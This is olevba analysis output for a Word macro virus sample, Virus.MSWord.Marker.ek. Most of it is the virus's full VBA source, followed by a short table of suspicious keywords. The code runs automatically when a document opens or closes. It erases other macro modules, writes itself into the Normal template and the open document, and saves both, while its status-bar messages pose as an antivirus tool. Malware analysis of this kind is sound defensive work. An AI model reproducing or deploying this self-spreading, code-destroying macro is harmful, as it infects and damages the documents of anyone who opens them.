olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.ek
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.ek - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Dim NInfectedByMe As Boolean
On Error Resume Next
NInfectedByMe = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Find("Yadi Thea Atuh", 1, 1, 100, 300)
If Not (NInfectedByMe) Then
  AutoCopyToNormal
End If
KillEmAll
End Sub
Private Sub KillEmAll()
Dim ADInfectedByMe As Boolean
  Dim i, j As Integer
  ADInfectedByMe = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Find("Yadi Thea Atuh", 1, 1, 100, 300)
   j = 1
   For Each Obj In NormalTemplate.VBProject.VBComponents
        i = NormalTemplate.VBProject.VBComponents.Item(j).CodeModule.CountOfLines
        If Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in Your Document..."
            NormalTemplate.VBProject.VBComponents.Item(j).CodeModule.DeleteLines 1, i
        End If
      j = j + 1
      Application.StatusBar = "MacroVirus Destroyer V. 1.00"
    Next Obj
        j = 1
        For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name <> "ThisDocument" Then
          i = ActiveDocument.VBProject.VBComponents.Item(j).CodeModule.CountOfLines
          Application.StatusBar = "Hasta La Vista " + Obj.Name + _
          " See yaa..."
          ActiveDocument.VBProject.VBComponents.Item(j).CodeModule.DeleteLines 1, i
        End If
        j = j + 1
      Next Obj
     If Not (ADInfectedByMe) Then
       i = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
       ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, i
       AutoCopyToDoc
     End If
  End Sub
Private Sub Document_Open()
On Error Resume Next
'Created by Yadi The Giant
'Yadi Thea Atuh
'MacroVirus Destroyer V. 1.01
'"<- this is a marker!  Jonhehehe@ho####.com"
KillEmAll
End Sub
Private Sub AutoCopyToNormal()
On Error Resume Next
Dim InfectedByMe As Boolean, Baris, B, i As Integer, s As Object
InfectedByMe = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Find("Yadi Thea Atuh", 1, 1, 100, 300)
If Not (InfectedByMe) Then
 Baris = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
 Set s = ActiveDocument.VBProject.VBComponents.Item(1)
 Application.StatusBar = "Copying Antivirus Macro to Normal Template"
 B = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
 NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, B
 NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString s.CodeModule.Lines(1, Baris)
 NormalTemplate.Save
 End If
End Sub

Private Sub AutoCopyToDoc()
Dim InfectedByMe As Boolean, Baris, B As Integer, s As Object
InfectedByMe = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Find("Yadi Thea Atuh", 1, 1, 100, 300)
If Not (InfectedByMe) Then
 Baris = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
 Set s = NormalTemplate.VBProject.VBComponents.Item(1)
 Application.StatusBar = "Copying Antivirus Macro to Document"
 B = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
 ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, B
 ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString s.CodeModule.Lines(1, Baris)
 ActiveDocument.Save
End If
End Sub


































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

